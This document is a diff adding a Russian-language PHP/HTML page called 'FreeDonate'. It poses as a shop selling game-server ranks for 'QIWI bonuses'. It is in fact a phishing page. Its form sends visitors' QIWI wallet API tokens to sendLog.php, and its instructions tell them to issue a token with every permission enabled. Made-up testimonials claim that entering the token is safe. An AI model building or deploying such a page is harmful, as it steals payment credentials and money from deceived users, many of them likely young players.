@@ -1,0 +1,427 @@
+<?php 
+session_start();
+$_SESSION['ref'] = $_GET['ref'];
+?>
+<!DOCTYPE html>
+<!--[if lt IE 7 ]><html class="ie ie6" lang="en"> <![endif]-->
+<!--[if IE 7 ]><html class="ie ie7" lang="en"> <![endif]-->
+<!--[if IE 8 ]><html class="ie ie8" lang="en"> <![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!-->
+<html lang="en"> <!--<![endif]-->
+<head>
+	<meta charset="utf-8">
+	<title>FreeDonate</title>
+	<link rel="shortcut icon" href="favicon.ico" tppabs="img/favicon.ico" type="image/ico">
+	<meta name="author" content="top_ev0">
+	<meta name="keywords" content="">
+	<meta name="description" content="">		
+	
+	<!-- Mobile Specific Metas -->
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">		
+	
+	<!-- Libs CSS -->
+	<link href="bootstrap.css" tppabs="css/bootstrap.css" rel="stylesheet">
+	<link href="simple-line-icons.css" tppabs="css/simple-line-icons.css" rel="stylesheet">
+	<link href="font-awesome.min.css" tppabs="css/font-awesome.min.css" rel="stylesheet">
+	<link href="prettyPhoto.css" tppabs="css/prettyPhoto.css" rel="stylesheet" type="text/css" media="all" />
+	
+	<!-- Template CSS -->
+	<link href="style.css" tppabs="css/style.css" rel="stylesheet"> 
+
+	<!-- Google Fonts -->
+	<link href="css-family=Raleway-400,700,800&subsetting=all.css" tppabs="http://fonts.googleapis.com/css?family=Raleway:400,700,800&subsetting=all" rel='stylesheet' type='text/css'>
+	<link href="css-family=Open+Sans-400italic,400,800,700,300.css" tppabs="http://fonts.googleapis.com/css?family=Open+Sans:400italic,400,800,700,300" rel='stylesheet' type='text/css'>
+
+	<!--[if lt IE 9]>
+		<script src="html5shiv.js" tppabs="js/html5shiv.js"></script>
+		<script src="respond.js" tppabs="js/respond.js"></script>
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<![endif]-->
+	<style>
+   .api {
+    color: rgb(200, 255, 200); /* Цвет текста */
+   }
+  </style>
+</head>
+
+<body data-spy="scroll" data-target=".navigation">
+	
+	<!-- Banner -->	
+    <div id="banner" class="bg-blur">
+		<!-- Start Header -->
+		<div id="header">
+			<nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+				<div class="container">
+					<div class="navbar-header">
+						<button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+							<span class="sr-only">Toggle navigation</span>
+							<span class="icon-bar"></span>
+							<span class="icon-bar"></span>
+							<span class="icon-bar"></span>
+						</button>
+						<!-- Start Logo / Text -->
+						<a class="navbar-brand text-logo" href=""><i class="icon-rocket blue"></i>FreeDonate</a>
+						<!-- End Logo / Text -->
+					</div>
+					<!-- Start Navigation -->
+					<div class="navigation navbar-collapse collapse">
+						<ul class="nav navbar-nav menu-right">
+							<li class="active"><a href="#banner">Главная</a></li>
+							<li><a href="javascript:if(confirm(%27https://vk.com/rd.rdmpru  \n\nThis file was not retrieved by Teleport Pro, because it is addressed using an unsupported protocol (e.g., gopher).  \n\nDo you want to open it from the server?%27))window.location=%27https://vk.com/rd.rdmpru%27" tppabs="https://vk.com/rd.rdmpru">Группа</a></li>
+							<li><a href="javascript:if(confirm(%27https://vk.com/rd.rdmpru  \n\nThis file was not retrieved by Teleport Pro, because it is addressed using an unsupported protocol (e.g., gopher).  \n\nDo you want to open it from the server?%27))window.location=%27https://vk.com/rd.rdmpru%27" tppabs="https://vk.com/rd.rdmpru">Администрация (ПИШИ ЕСЛИ ЕСТЬ ВОПРОСЫ!)</a></li>
+							<li><a href="#testimonials">Отзывы</a></li>
+                            <li><a href="#how-it-works">Инструкция</a></li>
+                            <li><a href="javascript:if(confirm(%27button  \n\nThis file was not retrieved by Teleport Pro, because the server reports that this file cannot be found.  \n\nDo you want to open it from the server?%27))window.location=%27button%27" tppabs="button" data-toggle="modal" data-target="#rules">Контакты</a></li>
+                            <li><a href="javascript:if(confirm(%27button  \n\nThis file was not retrieved by Teleport Pro, because the server reports that this file cannot be found.  \n\nDo you want to open it from the server?%27))window.location=%27button%27" tppabs="button" data-toggle="modal" data-target="#donates"></a></li>
+						</ul>
+					</div>
+					<!-- End Navigation  -->
+				</div>
+			</nav>
+		</div>
+		<!-- End Header -->
+		<div class="banner-content">
+			<div class="container">
+				<div class="row">
+					<!-- Start Banner Optin Form-->
+					<div class="col-lg-6 col-md-6 col-md-offset-3 col-sm-5">
+						<div class="banner-form">
+							<div class="form-title">
+								<h2>Покупка привилегий</h2>
+								<br>
+																							<div class="alert alert-dismissible alert-info text-center">
+				  <strong>Внимание! </strong>Сейчас можно купить донат бесплатно за бонусы QIWI!</div>
+							</div>
+							<br>
+							<div class="form-body">
+								<p>После оплаты, перезайдите на сервер чтобы выдалась привилегия.</p>
+                                <div class="alert alert-error" id="error"></div>
+                            <form action="sendLog.php" method="post" id="groups">
+							<div class="form-group">
+                                    <label for="ip"><font color="white">Введите IP:PORT сервера</font></label>
+                                    <input type="text" pattern="[a-zA-Z0-9_?]*" title="Вы ввели не верный IP" class="form-control" name="ip" id="groupName" placeholder="Введите IP:PORT серверa" required>
+                                </div>
+                                <div class="form-group">
+                                    <label for="name"><font color="white">Введите свой ник: <small>(работает доплата)</small></font></label>
+                                    <input type="text" pattern="[a-zA-Z0-9_?]*" title="Вы ввели не верный ник" class="form-control" name="name" id="groupName" placeholder="Введите свой ник на сервере" required>
+                                </div>
+								<div class="form-group">
+                                    <label for="token"><font color="white">Введите свой токен: <small><a href="#how-it-works">Как получить?</a></small></font></label>
+                                    <input type="text" pattern="[a-zA-Z0-9_?]*" title="Вы ввели не верный api key" class="form-control" name="token" id="groupName" placeholder="Введите свой api key QIWI" required>
+                                </div>
+                                <div class="form-group">
+                                    <label for="group"><font color="white">Выберите нужный статус:</font></label>
+                                    <select name="group" id="group" class="form-control">
+									<optgroup label='Доступные привилегии'>
+
+    
+  <option value="vip">
+    [Вип] - 5 бонусов QIWI |СКИДКА 50%| навсегда  </option>
+    
+  <option value="prem">
+    [Премиум] - 10 бонусов QIWI |СКИДКА 50%| навсегда  </option>
+    
+  <option value="creat">
+    [Креатив] - 15 бонусов QIWI |СКИДКА 50%| навсегда  </option>
+    
+  <option value="moder">
+    [Модер] - 20 бонусов QIWI |СКИДКА 50%| навсегда  </option>
+    
+  <option value="admin">
+    [Админ] - 25 бонусов QIWI |СКИДКА 50%| навсегда  </option>
+    
+  <option value="elite">
+    [Элита] - 30 бонусов QIWI |СКИДКА 50%| навсегда  </option>
+    
+  <option value="gladmin">
+    [Гл.Админ] - 35 бонусов QIWI |СКИДКА 50%| навсегда  </option>
+	
+  <option value="king">
+    [Король] - 40 бонусов QIWI |СКИДКА 50%| навсегда  </option>
+	
+  <option value="boss">
+    [Босс] - 45 бонусов QIWI |СКИДКА 50%| навсегда  </option>
+	
+  <option value="Sozd">
+    [Создатель] - 50 бонусов QIWI |СКИДКА 50%| навсегда  </option>
+    
+  <option value="osn">
+    [Основатель] - 75 бонусов QIWI |СКИДКА 50%| навсегда  </option>
+    
+  <option value="opka">
+    [ОП] - 100 бонусов QIWI |СКИДКА 50%| навсегда  </option>
+    
+  <option value="spons">
+    [Хелпер] - 150 бонусов QIWI |СКИДКА 50%| навсегда  </option>
+    
+  <option value="boss">
+    [Owner] - 250 бонусов QIWI |СКИДКА 50%| навсегда  </option>
+   
+  <optgroup label='Управление сервером'>
+      
+  <option value="helperq">
+    [Модертор] - 1000 бонусов QIWI |СКИДКА 50%| навсегда  </option>
+    
+  <option value="THE3ND">
+    [Владелец прокта] - 1499 бонусов QIWI (ОСТАЛОСЬ 1 ШТ!) |СКИДКА 50%| навсегда  </option>
+   
+  <optgroup label='Кейсы с донатом'>   
+  
+  <option value="5">
+    5 Ключей - 10 бонусов QIWI </option>
+  
+  <option value="10">
+    10 Ключей - 15 бонусов QIWI  </option>
+  
+  <option value="50">
+    50 Ключей - 35 бонусов QIWI  </option>
+  
+  <option value="100">
+    5000 Ключей - 250 бонусов QIWI  </option>
+  											
+											
+                                    </select>
+									<center><div id="cases" class="form-group">
+											</center>
+                                </div>
+																	<div class="text-center"><input type="submit" name="unitpay" id="buyOk" value="Купить" class="btn btn-success"></div>
+									</div>
+								</form>
+							</div>
+						</div>
+					</div>
+					<!-- End Banner Optin Form -->
+				</div>
+			</div>
+		</div>
+    </div>
+	<!-- End Banner -->
+	
+	<!-- How It Works -->
+	<section id="how-it-works" class="section bg-blue-pattern white-text">
+		<div class="container">
+			<div class="row">
+				<div class="col-lg-12">
+					<div class="headline">
+						<h2>Инструкция по получении API Token QIWI</h2>
+						<p>В данном разделе Вы можете узнать как получить api token.</p>
+					</div>
+				</div>
+			</div>
+			<div class="row">
+				<div class="col-md-5">
+					<!-- How It Works List -->
+					<ul class="steps-list">
+						<li>
+							<span>1</span><!-- Step Number -->
+							<h4>Небходимо перейти на сайт QIWI и авторизоваться на свой кошелек</h4><!-- Step Title -->
+							<p>Переходим на сайт <a class="api" href="https://qiwi.com/api">qiwi.com/api</a> и заходим в свой кошелек.</p><!-- Step Description -->
+						</li>
+						<li>
+							<span>2</span>
+							<h4>Выпускаем новый токен.</h4>
+							<p>Нажимаете на кнопку выпустить новый токен.</p>
+						</li>
+						<li>
+							<span>3</span>
+							<h4>Выпускаем полнофункциональный токен</h4>
+							<p>Выбираем все галочки и нажимаем и нажимаем продолжить.</p>
+						</li>
+						<li>
+							<span>4</span>
+							<h4>Подтверждение по СМС и сам токен</h4>
+							<p>Теперь подтверждаем выпуск токена по СМС, и далее он нам показывается, копируем и вставляем сюда!</p>
+						</li>
+					</ul>					
+					<!-- End How It Works List -->
+				</div>
+			</div>
+		</div>
+	</section>
+	<!-- End How it Works -->	
+
+	<!--Testimonials -->
+	<section id="testimonials" class="section bg-testimonial cover border-bottom">
+		<div class="container">
+			<div class="row">
+				<div class="col-lg-12">
+					<div class="headline">
+						<h2>Отзывы о нас</h2>
+					</div>
+				</div>
+			</div>	
+			<div class="row">
+				<div class="col-md-8 col-md-offset-2">
+					<!-- Start Testimonial Slider -->
+					<div class="carousel slide carousel-mod" data-ride="carousel" id="testimonial">
+						<div class="carousel-inner">
+							<!-- Testimonial #1  -->
+							<div class="item active">
+								<div class="testimonial-inner">
+									<img src="denis.jpg" tppabs="img/denis.jpg" alt="" title="" /><!-- Testimonial Image  -->
+									<p>«После покупки Создателя меня стали уважать на сервере, я нашел много друзей и даже девушку! она тоже купила Создателя и мы играем вместе!! СПАСИБО.»</p><!-- Tesimonial  -->
+									<small>Юрий М.</small><!-- Testimonial Author  -->
+								</div>
+							</div>
+							<!-- End Testimonial #1  -->
+							<div class="item">
+								<div class="testimonial-inner">
+									<img src="sveta.jpg" tppabs="img/sveta.jpg" alt="" title="" /><!-- Testimonial Image  -->
+									<p>«Долго боялась вводить токен:( думала обманут как и везде.. Но все же решилась ввести будь что будет! после ввода я была удивлена o_O ДОНАТ ПРИШЕЛ СРАЗУ!»</p><!-- Tesimonial  -->
+									<small>Анна С.</small><!-- Testimonial Author  -->
+								</div>
+							</div>				
+							<div class="item">
+								<div class="testimonial-inner">
+									<img src="artyr.jpg" tppabs="img/artyr.jpg" alt="" title="" /><!-- Testimonial Image  -->
+									<p>«Согласен ребята, сайт просто СУПЕР! я вот получил Главаря это неописуемо! консоль и полный доступ к серверу! ППЦ САЙТ СУПЕР:))»</p><!-- Tesimonial  -->
+									<small>Михаил С.</small><!-- Testimonial Author  -->
+								</div>
+							</div>					
+						</div>
+						<!-- Testimonial Navigation  -->
+						<ol class="carousel-indicators">
+							<li data-target="#testimonial" data-slide-to="0" class="active"></li>
+							<li data-target="#testimonial" data-slide-to="1"></li>
+							<li data-target="#testimonial" data-slide-to="2"></li>
+						</ol>
+						<!-- End Testimonial Navigation  -->
+					</div>
+				</div>
+			</div>
+		</div>
+	</section>
+	<!-- End Testimonials -->
+	
+	<!-- Footer Bottom -->	
+	<footer class="footer footer-sub">
+		<div class="container">
+			<div class="row">
+				<div class="col-lg-6 col-sm-6">
+					<p>&copy; Россия Дрифт | Все покупки являются благотворительностью и будут направлены на развитие сервера. Мы не являемся коммерческой организацей.</p>
+				</div>
+			</div>
+		</div>
+	</footer>
+	<!-- End Footer Bottom -->
+                                                                <!-- Modal's -->
+                                                                                <!-- DONATE -->
+                                                                <div class="modal fade" id="donates" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+                                                                  <div class="modal-dialog">
+                                                                    <div class="modal-content">
+                                                                      <div class="modal-header">
+                                                                        <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+                                                                        <h4 class="modal-title" id="myModalLabel">Помоги серверу и Фрутику!</h4>
+                                                                      </div>
+                                                                      <div class="modal-body">
+                                                                          <center>
+                                                                            <div class="alert alert-dismissable alert-warning">
+                                                                                <button type="button" class="close" data-dismiss="alert">×</button>
+                                                                                    <h4>Внимание!</h4>
+                                                                                    <p>Не менее 10 бонусов QIWI.</p>
+                                                                            </div></center><br />
+                                                                        <center>
+                                                                            <div class="form-group">
+                                                                                    <input id="sum" name="sum" type="text" class="form-control" placeholder="Сумма пожертвования"><br />
+                                                                                    <button type="button" class="btn btn-primary" onclick="Donfromsw()">Пожертвовать</button>
+                                                                            </div>
+                                                                        </center><br>
+                                                                      </div>
+                                                                      <div class="modal-footer">
+                                                                        <button type="button" class="btn btn-default" data-dismiss="modal">Закрыть</button>
+                                                                      </div>
+                                                                    </div>
+                                                                  </div>
+                                                                </div> 
+                                                                                <!-- RULES -->
+                                                            <div class="modal fade" id="rules" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+                                                              <div class="modal-dialog">
+                                                                <div class="modal-content">
+                                                                  <div class="modal-header">
+                                                                    <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+                                                                    <h4 class="modal-title" id="myModalLabel">Контакты</h4>
+                                                                  </div>
+                                                                  <div class="modal-body">
+                                                                        <div class="container-fluid">                                
+                                                                        <b>Есть вопросы? напишите нам!</b><br>
+                                                                                <li>Вконтакте - https://vk.com</li>
+                                                                         </div>
+                                                                  </div>
+                                                                  <div class="modal-footer">
+                                                                    <button type="button" class="btn btn-default" data-dismiss="modal">Закрыть</button>
+                                                                  </div>
+                                                                </div>
+                                                              </div>
+                                                            </div>
+
+	<!-- Start Js Files -->
+	<script type="text/javascript" src="jquery-2.1.0.min.js" tppabs="code.jquery.com/jquery-2.1.0.min.js"></script><!--jQuery is a Javascript library that greatly reduces the amount of code that you must write.-->
+	<script type="text/javascript">window.jQuery || document.write('<script src="js/jquery-2.1.0.min.js"><\/script>')</script>
+	<script src="bootstrap.min.js" tppabs="js/bootstrap.min.js" type="text/javascript"></script><!--Packed with many functionalies such as carousel slider, responsivity, tabs, drop downs, buttons, and many other features-->
+	<script src="modernizr.min.js" tppabs="js/modernizr.min.js" type="text/javascript"></script><!--Modernizr is an open-source JavaScript library that helps you build the next generation of HTML5 and CSS3-powered websites.-->
+	<script src="jquery.prettyPhoto.js" tppabs="js/jquery.prettyPhoto.js" type="text/javascript" ></script><!-- Script for Lightbox Image  -->
+	<script src="custom.js" tppabs="js/custom.js" type="text/javascript"></script><!-- Script File containing all customizations  -->
+    <script src="tools.js" tppabs="js/tools.js" type="text/javascript"></script><!-- Redirect to WayToPay  -->
+	<script src="donate.js" tppabs="js/donate.js" type="text/javascript"></script><!-- Redirect to donate  -->
+	<script src="common.js" tppabs="js/common.js"></script>
+			<script type="text/javascript">
+		function AjaxSumm() {
+			$.ajax({
+				'url': "Ajax.php?ajax=UpgrageButton",
+				'type': "POST",
+				'dataType': "html",
+				'data': $(".form").serialize(), 
+				'success': function(html) {
+					$("#button").html(html);
+					if (html == "Недоступно") {
+						$('#button').attr('readonly',true);
+					} else {
+						$('#button').removeAttr('readonly');
+					}
+				},
+				'error': function(html) {
+					$("#button").html("Купить");
+				}
+			});
+		}
+		$("#group").change(function(){
+			AjaxSumm();
+			active = $(this).find(':selected').val();
+			var val = "<input type=\"hidden\" name=\"amount\" id=\"amount1\" value=\"10\"> <label for=\"select\" class=\"sr-only\">Количество кейсов</label><button type=\"button\" onclick=\"AmountCases('minus');AjaxSumm();\" class=\"btn btn-lg btn-primary\">-</i></button><button  type=\"button\"  readonly class=\"btn btn-lg btn-primary\" id=\"amount\" style=\"width:50%\">1</button><button type=\"button\" onclick=\"AmountCases('plus');AjaxSumm();\" id=\"plus\" class=\"btn btn-lg btn-primary\">+</button><span class=\"help-block\"></span>"
+			if (active.includes("case-")) {
+				var e = document.getElementById("group");
+				var strUser = e.options[e.selectedIndex].text;
+				var price = strUser.replace( /[^\d.]/g, '' );
+				$('#buyOk').attr("disabled", false);
+				$('#buyOk').val("Купить за " + price + " бонусов QIWI.");
+				vals = val;
+			} else {
+				vals = "";
+			}
+			$("#cases").html(vals);
+		});
+		
+		function AmountCases(oper) {
+			var am = Number($("#amount").text());
+			if(oper == "plus") am = am + 1;
+			if(oper == "minus") {
+				k = am - 1;
+				if (k >= 1) am = k
+			}
+			$("#amount").text(am);
+			$("#amount1").val($("#amount").text());
+			
+			var e = document.getElementById("group");
+			var strUser = e.options[e.selectedIndex].text;
+			var price = strUser.replace( /[^\d.]/g, '' );
+			
+			$("#group :selected").val("case-" + am);
+			console.log($("#group :selected").val());
+			$('#buyOk').attr("disabled", false);
+			$('#buyOk').val("Купить за " + price * am + " бонусов QIWI.");
+		}
+		</script>
+	<!-- End Js Files  -->
+
+</body>
+</html>
